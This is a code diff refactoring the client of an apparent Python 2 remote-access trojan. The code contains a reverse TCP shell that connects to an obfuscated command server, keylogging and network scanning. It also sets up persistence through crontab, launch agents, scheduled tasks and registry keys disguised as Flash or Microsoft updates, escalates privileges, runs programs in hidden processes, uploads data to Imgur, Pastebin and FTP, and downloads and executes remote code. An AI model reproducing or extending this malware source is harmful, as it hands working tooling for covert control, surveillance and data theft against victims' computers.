@@ -114,42 +114,49 @@ class Client():
 
     @staticmethod
     def _debug(data):
-        print(data) if Client.debug else None
+        print(bytes(data)) if Client.debug else None
 
 
     @staticmethod
-    def _xor(s, t):
-        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+    def _get_xor(s, t):
+        try:
+            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
 
 
     @staticmethod
-    def _pad(s, block_size):
-        return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'
+    def _get_padded(s, block_size):
+        try:
+            return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+
+    @staticmethod
+    def _get_blocks(s, block_size):
+        try:
+            return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_blocks.func_name, str(e)))
 
 
     @staticmethod
-    def _block(s, block_size):
-        return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
-
-
-    @staticmethod
-    def _long_to_bytes(x, default=False, **kwargs):
-        return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L'))) if default else urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
-  
-
-    @staticmethod
-    def _is_ipv4_address(address):
+    def _get_ipv4_address(address):
         try:
             if socket.inet_aton(str(address)):
                 return True
         except:
             return False
 
+
     @staticmethod
     def _configure(target, **kwargs):
         if hasattr(Client, target):
             for k,v in kwargs.items():
-                setattr(getattr(Client, target), k, v)
+                try:
+                    setattr(getattr(Client, target), k, v)
+                except Exception as e:
+                    Client._debug("{} returned error: {}".format(Client._configure.func_name, str(e)))
 
 
     @staticmethod
@@ -159,6 +166,52 @@ class Client():
         for key, value in headers.items():
             req.add_header(key, value)
         return urllib2.urlopen(req).read()
+
+
+    @staticmethod
+    def _ping(host):
+        try:
+            if bool(subprocess.call("ping -n 1 -w 90 {}".format(host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0 if os.name is 'nt' else subprocess.call("ping -c 1 -w 90 {}".format(host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0):
+                self._network[host] = {'ports': {}} if host not in self._network else self._network.get(host)
+                return True
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._ping.func_name, str(e)))
+        return False
+
+
+    @staticmethod
+    def _get_config(x):
+        try:
+            return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+
+
+    @staticmethod
+    def _get_address(a, b):
+        try:
+            ab  = json.loads(Client._post(a, headers={'API-Key': b}))
+            ip  = ab[ab.keys()[0]][0].get('ip')
+            if Client._get_ipv4_address(ip):
+                return ip
+            else:
+                Client._debug("Invalid IPv4 address ('{}')\nRetrying in 5...".format(ip))
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_address.func_name, str(e)))
+        time.sleep(5)
+        return Client._get_address(a, b)        
+
+    @staticmethod
+    def _get_connection(x, y):
+        try:
+            s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setblocking(True)
+            s.connect((x, y))
+            return s
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_connection.func_name, str(e)))
+        time.sleep(5)
+        return Client._get_connection(x, y)   
 
 
     @staticmethod
@@ -174,21 +227,32 @@ class Client():
 
     @staticmethod
     def _get_nth_prime(p):
-        return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     
+        try:
+            return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_nth_prime.func_name, str(e)))
 
 
     @staticmethod
-    def _get_host():
+    def _get_public_ip():
         try:
-            return {'public': urllib2.urlopen('http://api.ipify.org').read(), 'private': socket.gethostbyname(socket.gethostname())}
+            return urllib2.urlopen('http://api.ipify.org').read()
         except Exception as e:
-            Client._debug(str(e))
+            Client._debug("{} returned error: {}".format(Client._get_public_ip.func_name, str(e)))
 
 
+    @staticmethod
+    def _get_local_ip():
+        try:
+            socket.gethostbyname(socket.gethostname())
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_local_ip.func_name, str(e)))
+
+            
     @staticmethod                
     def _get_info():
         try:
-            return {k:v for k,v in zip(['ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'encryption', 'device'], [Client._get_host()['public'], Client._get_host()['private'], sys.platform, ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper(), int(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), bytes('AES' if 'AES' in globals() else 'XOR'), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
+            return {k:v for k,v in zip(['ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'encryption', 'device'], [Client._get_public_ip(), Client._get_local_ip(), sys.platform, ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper(), int(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), bytes('AES' if 'AES' in globals() else 'XOR'), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
         except Exception as e:
             Client._debug(str(e))
 
@@ -258,7 +322,7 @@ class Client():
 
 
     @classmethod
-    def _get_event(event):
+    def _get_event(self, event):
         try:
 
             if event.WindowName != vars(self.keylogger)['window']:
@@ -336,7 +400,7 @@ class Client():
     def deobfuscate(block):
         return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(block)))))
 
-    
+
     @staticmethod
     @config(platforms=['win32','linux2','darwin'], api_key=None)
     def _upload_imgur(source):
@@ -390,12 +454,12 @@ class Client():
     @staticmethod
     @config(block_size=8, key_size=16, num_rounds=32)
     def _encrypt_xor(data, key):
-        data    = Client._pad(data, Client._encrypt_xor.block_size)
-        blocks  = Client._block(data, Client._encrypt_xor.block_size)
+        data    = Client._get_padded(data, Client._encrypt_xor.block_size)
+        blocks  = Client._get_blocks(data, Client._encrypt_xor.block_size)
         vector  = os.urandom(8)
         result  = [vector]
         for block in blocks:
-            block   = Client._xor(vector, block)
+            block   = Client._get_xor(vector, block)
             v0, v1  = struct.unpack("!2L", block)
             k       = struct.unpack("!4L", key[:Client._encrypt_xor.key_size])
             sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
@@ -412,7 +476,7 @@ class Client():
     @config(block_size=8, key_size=16, num_rounds=32)
     def _decrypt_xor(data, key):
         data    = base64.b64decode(data)
-        blocks  = Client._block(data, Client._decrypt_xor.block_size)
+        blocks  = Client._get_blocks(data, Client._decrypt_xor.block_size)
         vector  = blocks[0]
         result  = []
         for block in blocks[1:]:
@@ -425,7 +489,7 @@ class Client():
                 sum = (sum - delta) & mask
                 v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
             decode = struct.pack("!2L", v0, v1)
-            output = Client._xor(vector, decode)
+            output = Client._get_xor(vector, decode)
             vector = block
             result.append(output)
         return ''.join(result).rstrip('\x00')
@@ -433,7 +497,7 @@ class Client():
 
     @staticmethod
     def _encrypt_aes(plaintext, key):
-        text        = Client._pad(plaintext, AES.block_size)
+        text        = Client._get_padded(plaintext, AES.block_size)
         iv          = os.urandom(AES.block_size)
         cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
         ciphertext  = iv + cipher.encrypt(text)
@@ -570,7 +634,7 @@ class Client():
     def _persistence_add_hidden_file(self):
         if hasattr(self, '__f__'):
             try:
-                value        = self._long_to_bytes(long(self.__f__))
+                value        = self._get_config(long(self.__f__))
             except:
                 value        = self.__f__
             if os.path.isfile(value):
@@ -595,7 +659,7 @@ class Client():
     def _persistence_remove_hidden_file(self):
         if hasattr(self, '__f__'):
             try:
-                filename     = self._long_to_bytes(long(self.__f__))
+                filename     = self._get_config(long(self.__f__))
             except:
                 filename      = self.__f__
             if os.path.isfile(filename):
@@ -612,7 +676,7 @@ class Client():
     def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
         if hasattr(self, '__f__'):
             try:
-                value       = self._long_to_bytes(long(self.__f__))
+                value       = self._get_config(long(self.__f__))
             except:
                 value       = self.__f__
             if os.path.isfile(value):
@@ -651,7 +715,7 @@ class Client():
     def _persistence_remove_crontab_job(self, name='flashplayer'):
         if hasattr(self, '__f__'):
             try:
-                value       = self._long_to_bytes(long(self.__f__))
+                value       = self._get_config(long(self.__f__))
             except:
                 value       = self.__f__
             if os.path.isfile(value):
@@ -673,12 +737,12 @@ class Client():
     def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
         if hasattr(self, '__f__') and hasattr(self, '__g__'):
             try:
-                value       = self._long_to_bytes(long(self.__f__))
+                value       = self._get_config(long(self.__f__))
             except:
                 value       = self.__f__
             if os.path.isfile(value):
                 try:
-                    code    = urllib2.urlopen(self._long_to_bytes(long(self.__g__))).read()
+                    code    = urllib2.urlopen(self._get_config(long(self.__g__))).read()
                     label   = name
                     if not os.path.exists('/var/tmp'):
                         os.makedirs('/var/tmp')
@@ -714,7 +778,7 @@ class Client():
     def _persistence_add_scheduled_task(self, name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__'):
             try:
-                value       = self._long_to_bytes(long(self.__f__))
+                value       = self._get_config(long(self.__f__))
             except:
                 value       = self.__f__
             if os.path.isfile(value):
@@ -746,7 +810,7 @@ class Client():
     def _persistence_add_startup_file(self, name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__'):
             try:
-                value = self._long_to_bytes(long(self.__f__))
+                value = self._get_config(long(self.__f__))
             except:
                 value = self.__f__
             if os.path.isfile(value):
@@ -790,7 +854,7 @@ class Client():
     def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__'):
             try:
-                value = self._long_to_bytes(long(self.__f__))
+                value = self._get_config(long(self.__f__))
             except:
                 value = self.__f__
             if os.path.isfile(value):
@@ -942,6 +1006,11 @@ class Client():
     # Public Methods
  
 
+    def run(self):
+        self.new_session()
+        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+        self._jobs[self.reverse_tcp_shell.func_name].start()
+
 
     @staticmethod
     @config(platforms=['win32','linux2','darwin'])
@@ -1031,7 +1100,7 @@ class Client():
         """
         try:
             if len(arg.split()) == 1:
-                host     = self._get_host()['private']
+                host     = self._get_local_ip()
                 if arg   == 'network':
                     mode = 'network'
                 elif arg == 'host':
@@ -1044,7 +1113,7 @@ class Client():
                 mode, _, host = arg.partition(' ')
                 if mode not in ('host', 'ports', 'network'):
                     return "usage: scan <mode> <ip>\nmode: network, host, ports"
-                if not self._is_ipv4_address(host):
+                if not self._get_ipv4_address(host):
                     return "Invalid target IP address"
             if mode == 'network':
                 return self._scan_network(host)
@@ -1320,10 +1389,18 @@ class Client():
         """
         disconnect from server but keep client alive
         """
-        try:
-            time.sleep(10)
+        def _standby(self):
             self.kill()
-            return self.run()
+            while True:
+                time.sleep(60)
+                self.new_session()
+                if self._session['connection'].is_set():
+                    break
+            return self.reverse_tcp_shell()
+        try:
+            self._jobs[self.standby.func_name] = threading.Timer(5.0, _standby, args=(self,))            
+            self._jobs[self.standby.func_name].start()
+            return "{} standing by".format(self._info.get('ip'))
         except Exception as e:
             return "{} returned error: '{}'".format(self.standby.func_name.strip('_').title(), str(e))
 
@@ -1331,7 +1408,7 @@ class Client():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='admin')
     def admin(self):
         """
-        check if current user has root privileges
+        check if current user has administrator privileges
         """
         try:   
             return "\tCurrent User:\t{}\n\tAdministrator:\t{}".format(self._info.get('username'),  bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()))
@@ -1347,9 +1424,9 @@ class Client():
         try:
             if self._info.get('administrator'):
                 return "Current user '{}' has administrator privileges".format(self._info.get('username'))
-            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__, default=True))):
+            if hasattr(self, '__f__') and os.path.isfile(long_to_bytes(long(self.__f__))):
                 if os.name is 'nt':
-                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._long_to_bytes(long(self.__f__, default=True))))
+                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
                     sys.exit()
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
@@ -1470,7 +1547,7 @@ class Client():
             self._exit = True
             self.kill()
             
-            if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))).read():
+            if hasattr(self, '__f__') and os.path.isfile(self._get_config(long(self.__f__))).read():
                 try:
                     os.remove(self.__f__)
                 except: pass
@@ -1489,33 +1566,12 @@ class Client():
             shutdown = threading.Timer(1, self._shutdown)
             shutdown.start()
             sys.exit(0)
+            
 
-
-    @config(platforms=['win32'], command=True, usage='powershell <cmd>')
-    def powershell(self, cmdline):
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='hide <path>')
+    def hide(self, path, shell=True):
         """
-        execute powershell commands in a hidden process
-        """
-        if os.name is 'nt':
-            try:
-                cmds = cmdline if type(cmdline) is list else str(cmdline).split()
-                info = subprocess.STARTUPINFO()
-                info.dwFlags = subprocess.STARTF_USESHOWWINDOW
-                info.wShowWindow = subprocess.SW_HIDE
-                command = ['powershell.exe', '/c', cmds]
-                p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
-                results, _ = p.communicate()
-                return results
-            except Exception as e:
-                return 'Powershell error: {}'.format(str(e))
-        else:
-            return 'Powershell is only available on Windows platforms'
-        
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='hidden <cmd>')
-    def hidden_process(self, path, shell=True):
-        """
-        launch a program in a hidden process 
+        execute a program in a hidden process 
         """
         try:
             info = subprocess.STARTUPINFO()
@@ -1527,11 +1583,7 @@ class Client():
             self._debug("Hidden process error: {}".format(str(e)))
             
 
-    @config(platforms=['win32','linux2','darwin'])
     def send_data(self, **kwargs):
-        """
-        encrypts message then appends the given 'end' character before sending to server
-        """
         self._session['connection'].wait()
         try:
             self._session['socket'].sendall(self.encrypt(json.dumps(kwargs)) + '\n')
@@ -1539,11 +1591,7 @@ class Client():
             self._session['connection'].clear()
 
 
-    @config(platforms=['win32','linux2','darwin'])
     def recv_data(self, end="\n"):
-        """
-        listens and receives incoming data until the given 'end' character appears in data then decrypts it and returns the message
-        """
         try:
             data = ""
             while end not in data:
@@ -1557,10 +1605,9 @@ class Client():
             self._debug('{} error: {}'.format(self.recv_data.func_name.strip('_').title(), str(e)))
 
         
-    @config(platforms=['win32','linux2','darwin'])
     def diffiehellman(self):
         """
-        Diffie-Hellman transactionless key-agreement with 2048-bit modulus
+        Diffie-Hellman transactionless key-agreement with 2048-bit modulus. Returns obfuscated 256-bit key
         """
         try:
             g  = 2
@@ -1577,29 +1624,14 @@ class Client():
             time.sleep(5)
             return self.run()
 
+
     def new_session(self, port=1337):
         """
         create connection with server and register a new encrypted session
         """
-        def _addr(a, b, c):
-            ab  = json.loads(self._post(a, headers={'API-Key': b}))
-            ip  = ab[ab.keys()[0]][0].get('ip')
-            if Client._is_ipv4_address(ip):
-                return _sock(ip, c)
-            else:
-                Client._debug("Invalid IPv4 address ('{}')\nRetrying in 5...".format(ip))
-                time.sleep(5)
-                return _addr(a, b, c)
-        def _sock(x, y):
-            s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setblocking(True)
-            s.connect((x, y))
-            return s
-
         self.kill()
-        
         try:
-            self._session['socket'] = _sock('localhost', int(port)) if self.debug else _addr(urllib.urlopen(self._long_to_bytes(long(self.__a__))).read(), self._long_to_bytes(long(self.__b__)), int(port))
+            self._session['socket'] = self._get_connection('localhost', int(port)) if hasattr(self, '__v__') else self._get_connection(self._get_address(urllib.urlopen(self._get_config(long(self.__a__))).read(), self._get_config(long(self.__b__))), int(port))
             self._session['connection'].set()
             self._debug('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))
 
@@ -1614,11 +1646,10 @@ class Client():
                 buf += self._session['socket'].recv(1024)
             self._session['id'] = self.decrypt(buf.rstrip())
             self._debug('Client ID: {}\n'.format(self._session['id']))
-            return
         except Exception as e:
             self._debug("{} returned error: {}\nrestarting in 5 seconds...".format(self.new_session.func_name, str(e)))
             time.sleep(5)
-        return self.run()
+            return self.run()
 
 
     def reverse_tcp_shell(self):
@@ -1649,7 +1680,7 @@ class Client():
                         
                         if command in self._commands:
 
-                            self._debug("Running client command '{}'...".format(self._commands[command]['method'].func_name))
+                            self._debug("Running client command '{}'".format(self._commands[command]['method'].func_name))
                             
                             try:
                                 result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
@@ -1657,10 +1688,10 @@ class Client():
                                 result  = "Error: %s" % bytes(e1)
                         else:
 
-                            self._debug("Running shell command '{}'...".format(self._commands[command].func_name))
+                            self._debug("Running shell command '{}'".format(command))
                             
                             try:
-                                result  = bytes().join(subprocess.Popen(task, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                                result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                             except Exception as e2:
                                 result  = "Error: %s" % bytes(e2)
 
@@ -1688,16 +1719,8 @@ class Client():
                 self._debug("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
                 time.sleep(5)
                 break
+        self.kill()
         return self.run()
-
-
-    def run(self):
-        """
-        start new session and send a shell back to server upon connection
-        """
-        self.new_session()
-        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
-        self._jobs[self.reverse_tcp_shell.func_name].start()
 
 
 
@@ -1712,7 +1735,7 @@ def main(*args, **kwargs):
             try:
                 exec "import urllib" in globals()
                 w = kwargs.get('w')
-                w = Client._long_to_bytes(w)
+                w = Client._get_config(w)
                 exec w in globals()
             except Exception as e:
                 Client._debug("Dynamic package imports failed: {}".format(str(e)))
@@ -1720,7 +1743,7 @@ def main(*args, **kwargs):
         if 'd' in kwargs:
             try:
                 d = kwargs.get('d')
-                imgur_api_key = Client._long_to_bytes(d)
+                imgur_api_key = Client._get_config(d)
                 Client._configure('_upload_imgur', api_key=imgur_api_key)
             except Exception as e2:
                 Client._debug("Dynamic Imgur configuration failed: {}".format(str(e2)))
@@ -1728,7 +1751,7 @@ def main(*args, **kwargs):
         if 'c' in kwargs:
             try:
                 c = kwargs.get('c')
-                pastebin_api_key = Client._long_to_bytes(c)
+                pastebin_api_key = Client._get_config(c)
                 Client._configure('_upload_pastebin', api_dev_key=pastebin_api_key)
             except Exception as e3:
                 Client._debug("Dynamic Pastebin configuration failed: {}".format(str(e3)))
@@ -1736,7 +1759,7 @@ def main(*args, **kwargs):
         if 'e' in kwargs:
             try:
                 e = kwargs.get('e')
-                pastebin_user_key = Client._long_to_bytes(e)
+                pastebin_user_key = Client._get_config(e)
                 Client._configure('_upload_pastebin', api_user_key=pastebin_user_key)
             except Exception as e4:
                 Client._debug("Dynamic Pastebin configuration failed: {}".format(str(e4)))
@@ -1744,7 +1767,7 @@ def main(*args, **kwargs):
         if 'q' in kwargs:
             try:
                 q = kwargs.get('q')
-                q = Client._long_to_bytes(q).split()
+                q = Client._get_config(q).split()
                 Client._configure('_upload_ftp', hostname=q[0], username=q[1], password=q[2])
             except Exception as e5:
                 Client._debug("Dynamic FTP configuration failed: {}".format(str(e5)))
@@ -1774,7 +1797,8 @@ if __name__ == '__main__':
   "r": "81126388790932157784",
   "s": "81399447134546511973",
   "u": "76299683425183950643", 
-  "t": "79310384705633414777", 
+  "t": "79310384705633414777",
+  "v": "00000000000000000000",
   "w": "77888090548015223857",
   "z": "79892739118577505130"
 })
